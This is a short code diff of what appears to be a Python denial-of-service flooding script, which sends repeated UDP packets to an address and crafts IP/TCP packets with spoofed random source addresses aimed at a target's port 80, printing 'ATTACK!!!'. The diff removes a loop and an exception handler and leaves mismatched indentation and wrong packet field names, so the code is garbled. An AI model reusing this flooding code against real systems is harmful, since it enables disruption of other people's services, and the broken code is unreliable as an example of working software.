@@ -51,16 +51,10 @@ def run():
 			for x in range(times):
 				s.sendto(data,addr)
 			print(i +" ATTACK!!!")
-
-         while True:
-
+                        print("[!] ATTACK!!!")
                     ip = choice(ips)
                     port = int(choice(ports))
                     IP1 = IP(source_IP=choice(ips), destination=target)
                     TCP1 = TCP(srcport=choice(ips), dstport=80)
                     pkt = IP1 / TCP1
                     send(pkt, inter=.001)
-	
-	except:
-			print("[!] ATTACK!!!")
-			
